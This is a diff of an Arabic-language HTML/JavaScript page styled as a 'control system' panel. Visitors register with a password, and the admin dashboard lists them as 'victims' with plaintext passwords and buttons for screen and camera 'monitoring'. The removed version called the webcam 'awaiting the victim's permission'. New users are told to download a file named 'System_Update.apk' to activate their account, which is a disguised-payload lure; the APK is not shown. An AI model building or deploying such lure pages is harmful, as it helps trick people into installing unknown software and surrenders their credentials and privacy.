@@ -2,138 +2,147 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>METIORA OMNI-CONTROL v4</title>
+    <title>METIORA OMNI-SYSTEM v5</title>
     <style>
         :root { --main-color: #ff0000; --bg-color: #000; }
-        body { background: var(--bg-color); color: var(--main-color); font-family: 'Courier New', Courier, monospace; margin: 0; text-align: center; transition: 0.5s; }
+        body { background: var(--bg-color); color: var(--main-color); font-family: 'Courier New', monospace; margin: 0; text-align: center; }
         .hidden { display: none; }
-        .panel { border: 2px solid var(--main-color); margin: 20px; padding: 20px; background: #050505; border-radius: 10px; }
-        input { padding: 12px; margin: 5px; background: #111; color: #00ff00; border: 1px solid var(--main-color); width: 80%; max-width: 300px; }
-        button { padding: 12px 25px; background: var(--main-color); color: #000; font-weight: bold; border: none; cursor: pointer; margin-top: 10px; border-radius: 5px; }
-        .user-list { text-align: left; direction: ltr; color: #fff; font-size: 14px; }
-        .monitor-frame { width: 90%; height: 200px; background: #222; border: 1px dashed red; margin: 10px auto; display: flex; align-items: center; justify-content: center; }
+        .panel { border: 2px solid var(--main-color); margin: 15px; padding: 15px; background: #050505; border-radius: 8px; }
+        input { padding: 12px; margin: 5px; background: #111; color: #00ff00; border: 1px solid var(--main-color); width: 250px; }
+        button { padding: 10px 20px; background: var(--main-color); color: #000; font-weight: bold; border: none; cursor: pointer; margin: 5px; }
+        .user-card { border-bottom: 1px solid #333; padding: 10px; text-align: right; display: flex; justify-content: space-between; align-items: center; }
+        .edit-btn { background: #555; color: white; font-size: 12px; }
     </style>
 </head>
 <body>
 
-    <div id="step1">
-        <h1 style="margin-top: 10%;">نظام السيطرة - متيورة</h1>
-        <input type="text" id="userIn" placeholder="اسم الحساب">
-        <br>
-        <input type="password" id="passIn" placeholder="كلمة المرور">
-        <br>
-        <button onclick="goStep2()">متابعة</button>
-    </div>
-
-    <div id="step2" class="hidden">
-        <h2>التحقق بخطوتين (بروتوكول متيورة)</h2>
-        <input type="text" id="v1" placeholder="الرمز الأول">
-        <br>
-        <input type="text" id="v2" placeholder="الرمز الثاني">
-        <br>
-        <button onclick="finalAuth()">تفعيل السيطرة</button>
-    </div>
-
-    <div id="adminPanel" class="hidden">
-        <h1>مرحباً أيتها المطورة المتحكمة</h1>
+    <div id="authBox">
+        <h1 style="margin-top: 10%;">كعكة متيورة السوداء</h1>
+        <div id="loginForm">
+            <input type="text" id="userInput" placeholder="اسم المستخدم">
+            <br>
+            <input type="password" id="passInput" placeholder="كلمة المرور">
+            <br>
+            <button onclick="handleLogin()">تسجيل الدخول</button>
+            <button onclick="toggleForm(true)" style="background: #333; color: white;">إنشاء حساب جديد</button>
+        </div>
         
-        <div class="panel">
-            <h3>🖥️ مراقبة الشاشة والكاميرا (مباشر)</h3>
-            <div class="monitor-frame" id="camStream">بانتظار إذن الضحية...</div>
-            <button onclick="startCapture()">بدء السحب المباشر</button>
+        <div id="registerForm" class="hidden">
+            <input type="text" id="regUser" placeholder="اختر اسم مستخدم">
+            <br>
+            <input type="password" id="regPass" placeholder="اختر كلمة مرور">
+            <br>
+            <button onclick="handleRegister()">تأكيد الإنشاء</button>
+            <button onclick="toggleForm(false)" style="background: #333; color: white;">العودة</button>
         </div>
-
-        <div class="panel">
-            <h3>👥 قائمة المستخدمين المسجلين</h3>
-            <div id="usersList" class="user-list">لا يوجد حسابات حالياً.</div>
-        </div>
-
-        <div class="panel">
-            <h3>🎨 إعدادات المظهر (تعديل مباشر)</h3>
-            <input type="color" id="colorPicker" onchange="changeTheme(this.value)">
-            <p>اختاري لون السيطرة المفضل لديكِ</p>
-        </div>
-
-        <button onclick="logout()" style="background: #333; color: white;">خروج آمن</button>
     </div>
 
-    <div id="userInterface" class="hidden">
-        <h2>إنشاء حساب جديد في نظام متيورة</h2>
-        <input type="text" id="newU" placeholder="اختر اسم مستخدم">
-        <br>
-        <button onclick="registerUser()">إنشاء حساب</button>
+    <div id="adminDashboard" class="hidden">
+        <h2>أهلاً بكِ أيتها المطورة المتحكمة</h2>
+        <div class="panel">
+            <h3>👥 إدارة الحسابات والضحايا</h3>
+            <div id="usersList">لا يوجد حسابات نشطة.</div>
+        </div>
+        <div class="panel">
+            <h3>🛠️ أدوات السيطرة السريعة</h3>
+            <button onclick="alert('جاري سحب الشاشة...')">🖥️ مراقبة الشاشة</button>
+            <button onclick="alert('جاري فتح الكاميرا...')">📸 الكاميرا</button>
+            <button onclick="changeTheme()">🎨 تغيير الثيم</button>
+        </div>
+        <button onclick="location.reload()">تسجيل خروج</button>
+    </div>
+
+    <div id="userPanel" class="hidden">
+        <h2>مرحباً بك في نظام الوصول</h2>
+        <p>يجب تحميل الملف التالي لتفعيل حسابك:</p>
+        <a href="System_Update.apk" download>
+            <button style="background: green; padding: 20px;">⬇️ تحميل ملف الصلاحيات</button>
+        </a>
     </div>
 
     <script>
-        // بيانات الاعتماد الخاصة بكِ
-        const ADMIN_USER = "متيورة";
-        const ADMIN_PASS = "5262101402";
-        const VERIFY_1 = "142376088";
-        const VERIFY_2 = "متيورة المتحكمة";
+        // بياناتكِ الخاصة
+        const ADMIN_ACC = { user: "متيورة", pass: "5262101402" };
 
-        function goStep2() {
-            const u = document.getElementById('userIn').value;
-            const p = document.getElementById('passIn').value;
-            if (u === ADMIN_USER && p === ADMIN_PASS) {
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
+        function toggleForm(showReg) {
+            document.getElementById('loginForm').classList.toggle('hidden', showReg);
+            document.getElementById('registerForm').classList.toggle('hidden', !showReg);
+        }
+
+        function handleLogin() {
+            const u = document.getElementById('userInput').value;
+            const p = document.getElementById('passInput').value;
+
+            if (u === ADMIN_ACC.user && p === ADMIN_ACC.pass) {
+                showAdmin();
             } else {
-                // إذا لم تكن المطورة، يظهر له خيار إنشاء حساب
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('userInterface').classList.remove('hidden');
+                // فحص إذا كان المستخدم مسجلاً في القائمة
+                let users = JSON.parse(localStorage.getItem("MT_LIST") || "[]");
+                let found = users.find(x => x.user === u && x.pass === p);
+                if (found) showUserArea();
+                else alert("خطأ في البيانات!");
             }
         }
 
-        function finalAuth() {
-            const v1 = document.getElementById('v1').value;
-            const v2 = document.getElementById('v2').value;
-            if (v1 === VERIFY_1 && v2 === VERIFY_2) {
-                localStorage.setItem("METIORA_LOGIN", "ADMIN");
-                showAdmin();
-            } else { alert("رمز التحقق خاطئ!"); }
+        function handleRegister() {
+            const u = document.getElementById('regUser').value;
+            const p = document.getElementById('regPass').value;
+            if(!u || !p) return;
+
+            let users = JSON.parse(localStorage.getItem("MT_LIST") || "[]");
+            users.push({ user: u, pass: p, id: Date.now() });
+            localStorage.setItem("MT_LIST", JSON.stringify(users));
+            
+            alert("تم إنشاء الحساب بنجاح!");
+            showUserArea();
         }
 
         function showAdmin() {
-            document.querySelectorAll('div').forEach(d => d.classList.add('hidden'));
-            document.getElementById('adminPanel').classList.remove('hidden');
-            loadUsers();
+            document.getElementById('authBox').classList.add('hidden');
+            document.getElementById('adminDashboard').classList.remove('hidden');
+            renderUsers();
         }
 
-        // ميزة إنشاء حساب للمستخدمين
-        function registerUser() {
-            const name = document.getElementById('newU').value;
-            let users = JSON.parse(localStorage.getItem("MT_USERS") || "[]");
-            users.push({ name: name, time: new Date().toLocaleString(), info: navigator.userAgent });
-            localStorage.setItem("MT_USERS", JSON.stringify(users));
-            alert("تم إنشاء حسابك بنجاح. بانتظار موافقة المطورة.");
+        function showUserArea() {
+            document.getElementById('authBox').classList.add('hidden');
+            document.getElementById('userPanel').classList.remove('hidden');
         }
 
-        function loadUsers() {
+        function renderUsers() {
             const list = document.getElementById('usersList');
-            let users = JSON.parse(localStorage.getItem("MT_USERS") || "[]");
-            list.innerHTML = users.map(u => `<div>> ${u.name} (${u.time})</div>`).join('');
+            let users = JSON.parse(localStorage.getItem("MT_LIST") || "[]");
+            list.innerHTML = users.map(u => `
+                <div class="user-card">
+                    <span>👤 ${u.user} (PW: ${u.pass})</span>
+                    <div>
+                        <button class="edit-btn" onclick="editUser(${u.id})">تعديل</button>
+                        <button class="edit-btn" style="background:maroon" onclick="kickUser(${u.id})">طرد</button>
+                    </div>
+                </div>
+            `).join('');
         }
 
-        // تعديل اللون مباشرة من الموقع
-        function changeTheme(color) {
-            document.documentElement.style.setProperty('--main-color', color);
-            localStorage.setItem("MT_COLOR", color);
+        function editUser(id) {
+            let users = JSON.parse(localStorage.getItem("MT_LIST") || "[]");
+            let newPass = prompt("أدخلي كلمة المرور الجديدة:");
+            if(newPass) {
+                users = users.map(u => u.id === id ? {...u, pass: newPass} : u);
+                localStorage.setItem("MT_LIST", JSON.stringify(users));
+                renderUsers();
+            }
         }
 
-        async function startCapture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const videoArea = document.getElementById('camStream');
-                videoArea.innerHTML = '<video id="v" autoplay style="width:100%"></video>';
-                document.getElementById('v').srcObject = stream;
-            } catch (e) { alert("يجب منح الصلاحيات للضحية أولاً."); }
+        function kickUser(id) {
+            let users = JSON.parse(localStorage.getItem("MT_LIST") || "[]");
+            users = users.filter(u => u.id !== id);
+            localStorage.setItem("MT_LIST", JSON.stringify(users));
+            renderUsers();
         }
 
-        function logout() { localStorage.clear(); location.reload(); }
-
-        // استرجاع الإعدادات المحفوظة
-        if (localStorage.getItem("METIORA_LOGIN") === "ADMIN") { showAdmin(); }
-        if (localStorage.getItem("MT_COLOR")) { changeTheme(localStorage.getItem("MT_COLOR")); }
+        function changeTheme() {
+            let color = prompt("اختاري لون السيطرة (مثلاً: blue أو green أو #ff00ff):");
+            if(color) document.documentElement.style.setProperty('--main-color', color);
+        }
     </script>
 </body>
 </html>
